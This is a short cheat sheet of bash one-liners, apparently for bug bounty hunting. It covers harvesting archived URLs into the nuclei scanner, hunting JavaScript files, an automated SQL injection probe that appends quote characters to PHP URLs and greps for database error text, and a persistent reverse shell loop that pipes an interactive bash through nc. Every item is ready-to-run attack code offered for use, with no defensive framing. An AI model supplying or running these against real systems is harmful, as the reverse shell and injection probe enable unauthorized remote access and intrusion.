## Simple 1Line #BASH For #BugBounty.

```
waybackurls TARGET.COM | grep = | tee urls.txt | nuclei -dast
```

```
gau TARGET.COM | grep = | tee urls.txt | nuclei -dast
```


## 1Line BASH To Perform #SQL_Injection For BugBounties.

```
cat urls.txt | grep ".php" | sed 's/\.php.*/.php\//' | sort -u | sed s/$/%27%22%60/ | while read url do ; do curl --silent "$url" | grep -qs "You have an error in your SQL syntax" && echo -e "$url \e[1;32mVulnerable to SQLI Injection\e[0m" || echo -e "$url \e[1;31mNot Vulnerable to SQLI Injection\e[0m" ;done
```


## LazyEgg - Hunting JS Files.

```
waybackurls target | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg[.]py "{}" --js_urls --domains --ips'
```


## Reverse Shell Bash Loop.

```
while true; do sleep 5 && mknod /dev/shm/p p; cat /dev/shm/p | /bin/bash -i | nc 127.0.0.1 9001 >/dev/shm/p; done
```
